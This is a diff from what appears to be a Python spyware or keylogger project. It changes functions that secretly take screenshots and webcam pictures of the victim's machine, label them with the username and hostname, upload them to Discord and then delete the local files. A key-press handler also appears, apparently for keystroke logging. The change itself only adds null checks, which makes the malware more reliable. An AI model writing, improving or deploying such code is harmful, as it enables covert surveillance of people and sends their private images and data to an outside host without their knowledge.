@@ -34,18 +34,20 @@ def should_send_file(key):
 
 def do_screenshot():
     screenshot = take_screenshot()
-    discord.send_file(screenshot,
-                      "screenshot_" + "_" + host.username + "_" + host.hostname + "_" + get_current_date() + ".png",
-                      "New Screenshot")
-    os.remove(screenshot)
+    if screenshot is not None:
+        discord.send_file(screenshot,
+                          "screenshot_" + "_" + host.username + "_" + host.hostname + "_" + get_current_date() + ".png",
+                          "New Screenshot")
+        os.remove(screenshot)
 
 
 def take_webcam_picture():
     webcam_pic = take_picture_from_webcam()
-    discord.send_file(webcam_pic,
-                      "webcam_" + "_" + host.username + "_" + host.hostname + "_" + get_current_date() + ".png",
-                      "New Webcam Picture")
-    os.remove(webcam_pic)
+    if webcam_pic is not None:
+        discord.send_file(webcam_pic,
+                          "webcam_" + "_" + host.username + "_" + host.hostname + "_" + get_current_date() + ".png",
+                          "New Webcam Picture")
+        os.remove(webcam_pic)
 
 
 def on_press(key):
